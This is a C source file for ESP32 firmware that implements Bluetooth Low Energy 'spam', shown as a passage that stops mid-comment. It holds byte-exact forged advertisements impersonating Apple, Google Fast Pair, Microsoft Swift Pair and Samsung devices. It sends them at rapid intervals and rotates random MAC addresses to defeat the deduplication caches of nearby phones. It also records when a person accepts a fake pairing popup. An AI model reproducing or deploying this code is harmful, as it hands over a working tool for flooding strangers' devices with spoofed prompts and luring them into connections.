#include "bt_spam.h"
#include <string.h>
#include "bt_spam_gap_sync.h"
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_err.h"
#include "esp_gap_ble_api.h"
#include "esp_heap_caps.h"
#include "esp_log.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"
#include "freertos/task.h"
#include "gap_dispatcher.h"
#include "radio_lease.h"

static const char* TAG = "bt_spam";

static bt_spam_cb_display display_records_cb = NULL;
static volatile bool running_task = false;
static volatile bool is_advertising_active = false;
static int adv_index = 0;
static TaskHandle_t adv_task_handle = NULL;
/* Written by the adv task on exit and polled by bt_spam_app_stop(); without
   volatile the compiler is free to hoist the load out of the poll loop and
   spin forever. Kept separate from the handle because xTaskCreate() takes a
   plain TaskHandle_t*. */
static volatile bool adv_task_running = false;
static SemaphoreHandle_t adv_sem = NULL;
/* Which completion answered which request; see bt_spam_gap_sync.h. */
static bt_spam_gap_sync_t gap_sync = {
    .completed = 0,
    .last_event = ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT,
    .last_status = ESP_BT_STATUS_SUCCESS};
static bt_spam_mode_t current_mode = BT_SPAM_MODE_ALL;
static bool gap_callback_registered = false;

/* Chained GAP callback for other modules (e.g., bt_gattc) */
static esp_gap_ble_cb_t chained_gap_cb = NULL;

/* Fires when a peer answers one of the spammed identities, so the UI can show
   the hit instead of only scrolling model names. */
static bt_spam_cb_connect connect_records_cb = NULL;

static uint32_t cycle_count = 0;
static uint32_t last_heap_log_cycle = 0;
static size_t min_free_heap_during_spam = 0;

/* Cycles (~250 ms each) an advertisement keeps the same random MAC before the
   address is rotated. Long enough for a peer to scan, cache the address and
   answer the connectable advertisement, short enough to outrun the per-address
   deduplication caches that the rotating address exists to defeat. */
#define SPAM_MAC_ROTATION_CYCLES 8

/*
 * ADV_TYPE_IND (connectable undirected advertising) allows adv_int down to 20ms
 * (0x20) and is required for Apple proximity/continuity modals, Android Fast
 * Pair, and Windows Swift Pair.
 */
static esp_ble_adv_params_t ble_adv_params = {
    .adv_int_min = 0x20, /* 20ms */
    .adv_int_max = 0x30, /* 30ms */
    .adv_type = ADV_TYPE_IND,
    .own_addr_type = BLE_ADDR_TYPE_RANDOM,
    .channel_map = ADV_CHNL_ALL,
    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

typedef enum {
  SPAM_TYPE_APPLE_PROXIMITY,
  SPAM_TYPE_APPLE_ACTION,
  SPAM_TYPE_GOOGLE_FAST_PAIR,
  SPAM_TYPE_MICROSOFT_SWIFT,
  SPAM_TYPE_SAMSUNG_SETUP,
} spam_packet_type_t;

typedef struct {
  const char* name;
  spam_packet_type_t type;
  uint8_t len;
  uint8_t data[31];
} spam_model_t;

/*
 * SAMSUNG EASY SETUP (Company ID 0x0075) - formatos verificados contra
 * simondankelmann/Bluetooth-LE-Spam (generadores EasySetupWatch/EasySetupBuds,
 * IDs originales de Flipper-XFW easysetup.c). El magic es fijo: solo cambia el
 * id de modelo/color al final del prefijo. La variacion anti-dedup la aporta
 * la rotacion de MAC aleatoria que ya hace el ciclo de advertising.
 *
 *   Watch: [0e ff 75 00] 01 00 02 00 01 01 ff 00 00 43 <watch_id>
 *   Buds:  [1b ff 75 00] 42 09 81 02 14 15 03 21 01 09 <a> <b> 01 <c>
 *                        06 3c 94 8e 00 00 00 00 c7 00
 */
#define SPAM_SAMSUNG_WATCH(id, model_name)                                 \
  {                                                                        \
      .name = model_name,                                                  \
      .type = SPAM_TYPE_SAMSUNG_SETUP,                                     \
      .len = 15,                                                           \
      .data = {0x0e, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, \
               0xff, 0x00, 0x00, 0x43, id},                                \
  }

#define SPAM_SAMSUNG_BUDS(a, b, c, model_name)                             \
  {                                                                        \
      .name = model_name,                                                  \
      .type = SPAM_TYPE_SAMSUNG_SETUP,                                     \
      .len = 28,                                                           \
      .data = {0x1b, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, \
               0x03, 0x21, 0x01, 0x09, a,    b,    0x01, c,    0x06, 0x3c, \
               0x94, 0x8e, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x00},            \
  }

static const spam_model_t spam_models[] = {
    /* =========================================================================
     * 1. APPLE PROXIMITY PAIRING (AirPods, Beats) - Type 0x07
     * =========================================================================
     */
    {
        .name = "Apple AirPods 1",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Apple AirPods 2",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Apple AirPods 3",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Apple AirPods Pro",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Apple AirPods Pro 2",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Apple AirPods Max",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Powerbeats",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Powerbeats Pro",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Beats Solo Pro",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Beats Studio Buds",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Beats Flex",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Beats Studio Pro",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Beats Fit Pro",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Beats Studio Buds+",
        .type = SPAM_TYPE_APPLE_PROXIMITY,
        .len = 31,
        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16,
                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },

    /* =========================================================================
     * 2. APPLE CONTINUITY / NEARBY ACTION MODALS - Type 0x10
     * =========================================================================
     */
    {
        .name = "AppleTV Setup",
        .type = SPAM_TYPE_APPLE_ACTION,
        .len = 17,
        .data = {0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x20, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Transfer Number",
        .type = SPAM_TYPE_APPLE_ACTION,
        .len = 17,
        .data = {0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x27, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "AirDrop Modal",
        .type = SPAM_TYPE_APPLE_ACTION,
        .len = 17,
        .data = {0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x09, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "HomePod Setup",
        .type = SPAM_TYPE_APPLE_ACTION,
        .len = 17,
        .data = {0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x0d, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "AppleTV Keyboard",
        .type = SPAM_TYPE_APPLE_ACTION,
        .len = 17,
        .data = {0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x05, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Apple Watch Setup",
        .type = SPAM_TYPE_APPLE_ACTION,
        .len = 17,
        .data = {0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x01, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "Setup New Phone",
        .type = SPAM_TYPE_APPLE_ACTION,
        .len = 17,
        .data = {0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x2b, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },
    {
        .name = "AppleTV Audio",
        .type = SPAM_TYPE_APPLE_ACTION,
        .len = 17,
        .data = {0x10, 0xff, 0x4c, 0x00, 0x10, 0x0b, 0x01, 0x13, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    },

    /* =========================================================================
     * 3. GOOGLE FAST PAIR (Android) - Service UUID 0xFE2C + TxPower Level (-21
     * dBm)
     * =========================================================================
     */
    {
        .name = "Google Pixel Buds",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0xdf, 0x28, 0x03, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "Pixel Buds Pro",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0x71, 0x8f, 0xa4, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "Pixel Buds A-Series",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0xa6, 0xb7, 0x96, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "Samsung Galaxy Buds FP",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0xee, 0x49, 0x23, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "Sony WH-1000XM4",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0x01, 0x82, 0x1e, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "Sony WF-1000XM4",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0x27, 0x18, 0x00, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "JBL Flip 6",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0xaa, 0x22, 0x11, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "Bose QC35 II",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0xf6, 0xc4, 0x20, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "JBL Live 300",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0x0a, 0x00, 0x02, 0x02, 0x0a, 0xeb},
    },
    {
        .name = "OnePlus Buds",
        .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
        .len = 17,
        .data = {0x02, 0x01, 0x06, 0x03, 0x03, 0x2c, 0xfe, 0x06, 0x16, 0x2c,
                 0xfe, 0xdf, 0xa9, 0xc4, 0x02, 0x0a, 0xeb},
    },

    /* =========================================================================
     * 4. MICROSOFT SWIFT PAIR (Windows 10 / 11) - Appearance (0x19) + Beacon
     * (0x03) + Name (0x09)
     * =========================================================================
     */
    {
        .name = "MS Surface Mouse",
        .type = SPAM_TYPE_MICROSOFT_SWIFT,
        .len = 29,
        .data = {0x02, 0x01, 0x06, 0x03, 0x19, 0xc2, 0x03, 0x06, 0xff, 0x06,
                 0x00, 0x03, 0x00, 0x80, 0x0e, 0x09, 'S',  'u',  'r',  'f',
                 'a',  'c',  'e',  ' ',  'M',  'o',  'u',  's',  'e'},
    },
    {
        .name = "MS Surface Keyboard",
        .type = SPAM_TYPE_MICROSOFT_SWIFT,
        .len = 27,
        .data = {0x02, 0x01, 0x06, 0x03, 0x19, 0xc1, 0x03, 0x06, 0xff,
                 0x06, 0x00, 0x03, 0x00, 0x80, 0x0c, 0x09, 'S',  'u',
                 'r',  'f',  'a',  'c',  'e',  ' ',  'K',  'b',  'd'},
    },
    {
        .name = "MS Surface Audio",
        .type = SPAM_TYPE_MICROSOFT_SWIFT,
        .len = 29,
        .data = {0x02, 0x01, 0x06, 0x03, 0x19, 0x42, 0x08, 0x06, 0xff, 0x06,
                 0x00, 0x03, 0x00, 0x80, 0x0e, 0x09, 'S',  'u',  'r',  'f',
                 'a',  'c',  'e',  ' ',  'A',  'u',  'd',  'i',  'o'},
    },
    {
        .name = "Xbox Controller",
        .type = SPAM_TYPE_MICROSOFT_SWIFT,
        .len = 31,
        .data = {0x02, 0x01, 0x06, 0x03, 0x19, 0xc4, 0x03, 0x06,
                 0xff, 0x06, 0x00, 0x03, 0x00, 0x80, 0x10, 0x09,
                 'X',  'b',  'o',  'x',  ' ',  'C',  'o',  'n',
                 't',  'r',  'o',  'l',  'l',  'e',  'r'},
    },

    /* =========================================================================
     * 5. SAMSUNG EASY SETUP - Company ID 0x0075
     * Watch = baliza Galaxy Watch (popup "Como conectar tu reloj");
     * Buds  = EasySetup de auriculares (popup de emparejamiento Buds).
     * IDs genuinos de Flipper-XFW easysetup.c / simondankelmann.
     * =========================================================================
     */
    SPAM_SAMSUNG_WATCH(0x1a, "Fallback Watch"),
    SPAM_SAMSUNG_WATCH(0x01, "White W4 Classic 44mm"),
    SPAM_SAMSUNG_WATCH(0x02, "Black W4 Classic 40mm"),
    SPAM_SAMSUNG_WATCH(0x03, "White W4 Classic 40mm"),
    SPAM_SAMSUNG_WATCH(0x04, "Black W4 44mm"),
    SPAM_SAMSUNG_WATCH(0x05, "Silver W4 44mm"),
    SPAM_SAMSUNG_WATCH(0x06, "Green W4 44mm"),
    SPAM_SAMSUNG_WATCH(0x07, "Black W4 40mm"),
    SPAM_SAMSUNG_WATCH(0x08, "White W4 40mm"),
    SPAM_SAMSUNG_WATCH(0x09, "Gold W4 40mm"),
    SPAM_SAMSUNG_WATCH(0x0a, "French W4"),
    SPAM_SAMSUNG_WATCH(0x0b, "French W4 Classic"),
    SPAM_SAMSUNG_WATCH(0x0c, "Fox W5 44mm"),
    SPAM_SAMSUNG_WATCH(0x11, "Black W5 44mm"),
    SPAM_SAMSUNG_WATCH(0x12, "Sapphire W5 44mm"),
    SPAM_SAMSUNG_WATCH(0x13, "Purple W5 40mm"),
    SPAM_SAMSUNG_WATCH(0x14, "Gold W5 40mm"),
    SPAM_SAMSUNG_WATCH(0x15, "Black W5 Pro 45mm"),
    SPAM_SAMSUNG_WATCH(0x16, "Gray W5 Pro 45mm"),
    SPAM_SAMSUNG_WATCH(0x17, "White W5 44mm"),
    SPAM_SAMSUNG_WATCH(0x18, "White Black W5"),
    SPAM_SAMSUNG_WATCH(0x1b, "Black W6 Pink 40mm"),
    SPAM_SAMSUNG_WATCH(0x1c, "Gold W6 40mm"),
    SPAM_SAMSUNG_WATCH(0x1d, "Silver W6 Cyan 44mm"),
    SPAM_SAMSUNG_WATCH(0x1e, "Black W6 Classic 43mm"),
    SPAM_SAMSUNG_WATCH(0x20, "Green W6 Classic 43mm"),

    SPAM_SAMSUNG_BUDS(0xee, 0x7a, 0x0c, "Fallback Buds"),
    SPAM_SAMSUNG_BUDS(0x9d, 0x17, 0x00, "Fallback Dots"),
    SPAM_SAMSUNG_BUDS(0x39, 0xea, 0x48, "Light Purple Buds2"),
    SPAM_SAMSUNG_BUDS(0xa7, 0xc6, 0x2c, "Bluish Silver Buds2"),
    SPAM_SAMSUNG_BUDS(0x85, 0x01, 0x16, "Black Buds Live"),
    SPAM_SAMSUNG_BUDS(0x3d, 0x8f, 0x41, "Gray Black Buds2"),
    SPAM_SAMSUNG_BUDS(0x3b, 0x6d, 0x02, "Bluish Chrome Buds2"),
    SPAM_SAMSUNG_BUDS(0xae, 0x06, 0x3c, "Gray Beige Buds2"),
    SPAM_SAMSUNG_BUDS(0xb8, 0xb9, 0x05, "Pure White Buds"),
    SPAM_SAMSUNG_BUDS(0xea, 0xaa, 0x17, "Pure White Buds2"),
    SPAM_SAMSUNG_BUDS(0xd3, 0x07, 0x04, "Black Buds"),
    SPAM_SAMSUNG_BUDS(0x9d, 0xb0, 0x06, "French Flag Buds"),
    SPAM_SAMSUNG_BUDS(0x10, 0x1f, 0x1a, "Dark Purple Buds Live"),
    SPAM_SAMSUNG_BUDS(0x85, 0x96, 0x08, "Dark Blue Buds"),
    SPAM_SAMSUNG_BUDS(0x8e, 0x45, 0x03, "Pink Buds"),
    SPAM_SAMSUNG_BUDS(0x2c, 0x67, 0x40, "White Black Buds2"),
    SPAM_SAMSUNG_BUDS(0x3f, 0x67, 0x18, "Bronze Buds Live"),
    SPAM_SAMSUNG_BUDS(0x42, 0xc5, 0x19, "Red Buds Live"),
    SPAM_SAMSUNG_BUDS(0xae, 0x07, 0x3a, "Black White Buds2"),
    SPAM_SAMSUNG_BUDS(0x01, 0x17, 0x16, "Sleek Black Buds2"),

    /* =========================================================================
     * 6. GENERIC ADVERTISING (Stealth mode) - No pairing popups
     * These are standard BLE advertisements that don't trigger any
     * platform-specific pairing modals. Useful for testing/measurement.
     * =========================================================================
     */
};

#define TOTAL_SPAM_MODELS (sizeof(spam_models) / sizeof(spam_models[0]))

static uint8_t active_indices[TOTAL_SPAM_MODELS];
static uint8_t active_indices_count = 0;

static bool model_matches_mode(const spam_model_t* model, bt_spam_mode_t mode) {
  switch (mode) {
    case BT_SPAM_MODE_APPLE:
      return (model->type == SPAM_TYPE_APPLE_PROXIMITY ||
              model->type == SPAM_TYPE_APPLE_ACTION);
    case BT_SPAM_MODE_ANDROID:
      return (model->type == SPAM_TYPE_GOOGLE_FAST_PAIR);
    case BT_SPAM_MODE_WINDOWS:
      return (model->type == SPAM_TYPE_MICROSOFT_SWIFT);
    case BT_SPAM_MODE_SAMSUNG:
      return (model->type == SPAM_TYPE_SAMSUNG_SETUP);
    case BT_SPAM_MODE_ALL:
    default:
      return true;
  }
}

/* A malformed advertising payload is worse than a missing one: a wrong AD
   length byte or a .len that disagrees with the byte count makes the peer's
   parser discard the whole advertisement, so the model silently never fires.
   Both mistakes are invisible in the struct itself (the compiler only warns
   about an overflowing initializer), which is why the table is checked here
   once per start instead of being trusted. */
static bool ad_payload_is_well_formed(const spam_model_t* model) {
  if (model->len == 0 || model->len > sizeof(model->data)) {
    return false;
  }
  uint8_t i = 0;
  while (i < model->len) {
    uint8_t ad_len = model->data[i];
    if (ad_len == 0) {
      return false;
    }
    if ((uint32_t) i + 1u + ad_len > model->len) {
      return false;
    }
    i = (uint8_t) (i + 1u + ad_len);
  }
  return i == model->len;
}

static void rebuild_active_indices(bt_spam_mode_t mode) {
  active_indices_count = 0;
  for (uint8_t i = 0; i < TOTAL_SPAM_MODELS; i++) {
    if (!ad_payload_is_well_formed(&spam_models[i])) {
      ESP_LOGE(TAG, "model \"%s\" has a malformed AD payload (len=%u); skipped",
               spam_models[i].name, (unsigned) spam_models[i].len);
      continue;
    }
    if (model_matches_mode(&spam_models[i], mode)) {
      active_indices[active_indices_count++] = i;
    }
  }
  if (active_indices_count == 0) {
    for (uint8_t i = 0; i < TOTAL_SPAM_MODELS; i++) {
      if (ad_payload_is_well_formed(&spam_models[i])) {
        active_indices[active_indices_count++] = i;
      }
    }
    if (active_indices_count == 0) {
      ESP_LOGE(TAG, "no usable advertising models in the table");
    }
  }
}

static void generate_random_mac(esp_bd_addr_t rand_addr) {
  esp_fill_random(rand_addr, ESP_BD_ADDR_LEN);
  /* Static random address: two MSBs must be 1 per BLE Core Spec (0xC0) */
  rand_addr[0] |= 0xC0;
}

static uint8_t prepare_payload(int index, uint8_t* out_buffer) {
  const spam_model_t* model = &spam_models[index];
  uint8_t len = model->len;
  memcpy(out_buffer, model->data, len);

  /* No byte is randomized here.
     The Apple payloads used to overwrite the "lid counter / auth tag" bytes to
     dodge dedup caches, but those offsets are invariant across all 14 proximity
     and all 8 action payloads (0x30/0x45/0x12/0x12/0x12 and a run of zeros):
     they are part of the fixed signature a real device broadcasts, not
     per-device state. Overwriting them made the advertisement one the phone had
     never seen and rejected, which is why no pairing popup ever appeared.
     Anti-dedup is the rotating random address instead - that is what actually
     defeats the per-address cache - and it leaves the payload byte-exact. */
  switch (model->type) {
    case SPAM_TYPE_MICROSOFT_SWIFT:
      /* In Swift Pair with Appearance: byte 13 is reserved RSSI byte, byte 12
       * is subscenario */
      break;

    case SPAM_TYPE_SAMSUNG_SETUP:
      /* Magic EasySetup fijo: en Watch los bytes 8-13 son parte de la firma
       * (01 ff 00 00 43). No randomizar nada aqui; la variacion anti-dedup
       * proviene del id de modelo y de la MAC aleatoria por ciclo. */
      break;

    case SPAM_TYPE_APPLE_PROXIMITY:
    case SPAM_TYPE_APPLE_ACTION:
    case SPAM_TYPE_GOOGLE_FAST_PAIR:
    default:
      break;
  }

  return len;
}

/*
 * GAP callback. All BLE operations are asynchronous in Bluedroid.
 * The semaphore adv_sem synchronizes the control task with GAP completion
 * events.
 */
static void esp_gap_cb(esp_gap_ble_cb_event_t event,
                       esp_ble_gap_cb_param_t* param) {
  /* Handle spam module events */
  switch (event) {
    case ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT:
      bt_spam_gap_sync_complete(&gap_sync, event,
                                param->adv_data_raw_cmpl.status);
      if (adv_sem != NULL) {
        xSemaphoreGive(adv_sem);
      }
      break;

    case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
      bt_spam_gap_sync_complete(&gap_sync, event, param->adv_start_cmpl.status);
      if (bt_spam_gap_sync_succeeded(&gap_sync)) {
        is_advertising_active = true;
      }
      if (adv_sem != NULL) {
        xSemaphoreGive(adv_sem);
      }
      break;

    case ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT:
      bt_spam_gap_sync_complete(&gap_sync, event, param->adv_stop_cmpl.status);
      if (bt_spam_gap_sync_succeeded(&gap_sync)) {
        is_advertising_active = false;
      }
      if (adv_sem != NULL) {
        xSemaphoreGive(adv_sem);
      }
      break;

    case ESP_GAP_BLE_SET_STATIC_RAND_ADDR_EVT:
      bt_spam_gap_sync_complete(&gap_sync, event,
                                param->set_rand_addr_cmpl.status);
      if (adv_sem != NULL) {
        xSemaphoreGive(adv_sem);
      }
      break;

    case ESP_GAP_BLE_ADV_TERMINATED_EVT: {
      is_advertising_active = false;
      /* A non-zero connection index means advertising ended because a peer
         accepted the identity we were offering - i.e. a pairing popup was
         answered. This is the one event that proves the spam is landing, and it
         is the only way to learn about it from GAP: Bluedroid has no GAP
         connection event, and registering a GATTC callback to get one would
         overwrite the single slot bt_gattc owns (the very clash gap_dispatcher
         exists to prevent). */
      if (param->adv_terminate.conn_idx != 0) {
        const char* name = (active_indices_count > 0)
                               ? spam_models[active_indices[adv_index]].name
                               : "unknown";
        ESP_LOGI(TAG, "peer accepted [%s] (conn_idx=%u)", name,
                 (unsigned) param->adv_terminate.conn_idx);
        if (connect_records_cb != NULL) {
          connect_records_cb(name, true);
        }
        /* No forced disconnect: esp_ble_gap_disconnect() needs the peer's BD
           address, which this event does not carry, and reaching for GATTC
           would take the single callback slot bt_gattc owns. Instead the link
           is left to the peer - who drops it right after pairing - and the loop
           below restarts advertising as soon as is_advertising_active clears.
         */
        break;
      }
      break;
    }

    case ESP_GAP_BLE_UPDATE_CONN_PARAMS_EVT:
      break;

    case ESP_GAP_BLE_AUTH_CMPL_EVT:
      break;

    case ESP_GAP_BLE_SEC_REQ_EVT:
      break;

    default:
      break;
  }

  /* Forward event to chained callback (e.g., bt_gattc for scanning) */
  if (chained_gap_cb != NULL) {
    chained_gap_cb(event, param);
  }
}

/**
 * @brief Set a chained GAP callback for other modules to receive events
 * @param cb Callback to chain (can be NULL to clear)
 */
void bt_spam_set_chained_gap_cb(esp_gap_ble_cb_t cb) {
  chained_gap_cb = cb;
}

/* Drop every token currently posted. Must be called *before* issuing an
   asynchronous GAP command, never after: btc_transfer_context() only blocks
   until BTC_TASK dequeues the message, so the completion event has not been
   delivered yet and a drain afterwards is a no-op. */
static inline void drain_sem(void) {
  if (adv_sem != NULL) {
    while (xSemaphoreTake(adv_sem, 0) == pdTRUE) {
    }
  }
}

/*
 * Waits for a *specific* Bluedroid GAP completion event.
 *
 * A single binary semaphore is fed by four different completion events
